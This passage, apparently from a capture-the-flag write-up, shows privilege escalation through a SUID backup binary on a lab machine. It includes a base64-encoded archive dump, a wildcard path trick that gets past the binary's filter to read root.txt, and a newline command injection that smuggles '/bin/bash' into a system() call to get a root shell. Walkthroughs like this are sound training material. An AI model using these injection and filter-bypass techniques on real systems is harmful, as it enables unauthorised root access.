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
```

### Vía wildcard

We can use the wildcard `?` to match any letter but without specifing the exact letter.

```bash
tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r??t/r??t.txt                                                                                                                        
UEsDBAoACQAAAOw+kFeCEiGmLQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQAD61d9ZetXfWV1eAsAAQQAAAAABAAAAACNsDboPXWWN0kkwq0d4QQObXv+tDFDOEpNOf5J/dcXBsSpBS1hKiAhflO3OiNQSwcIghIhpi0AAAAhAAAAUEsBAh4DCgAJAAAA7D6QV4ISIaYtAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAA+tXfWV1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAA
```

### Command injection via new line

Here we can see that system command is being used.

```bash
system("/usr/bin/zip -r -P magicword /tm"...zip warning: Permission denied
```

If we add a new line and a bash command to the system statement, we might be able to execute code.

```bash
tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "asd
> /bin/bash
> asd"
        zip warning: name not matched: asd

zip error: Nothing to do! (try: zip -r -P magicword /tmp/.backup_414166531 . -i asd)
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@node:/# whoami
root
```

The last line `> asd"` must be added to see the output of the bash command, otherwise all the output of the commands executed as root will be redirect to /dev/null, but we would still being executing commands as root.